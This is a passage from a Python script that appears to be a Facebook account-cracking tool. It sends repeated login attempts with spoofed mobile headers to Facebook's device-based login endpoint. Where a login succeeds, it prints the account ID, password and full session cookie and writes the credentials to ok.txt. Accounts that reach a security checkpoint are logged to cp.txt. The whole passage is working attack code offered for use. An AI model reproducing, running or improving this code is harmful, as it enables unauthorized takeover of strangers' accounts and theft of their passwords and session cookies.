			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'same-origin',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
			'user-agent': ua2};lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\033[1;92m[JARVIS-oK] '+uid+' | '+ps+'\033[1;32m')
				cek_apk(session,coki)
				print('\033[1;97m[🌕]'   +coki)
				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				# print('\033[1;91m[JARVIS-cP] '+uid+' | '+ps+'\033[1;32m')
				open('cp.txt', 'a').write(uid+' | '+ps+'\n')
				cps.append(cid)
				break

			else:
				continue
		loop+=1
	except:
		pass
		

if __name__=='__main__':
	#os.system("git pull")
	method1()
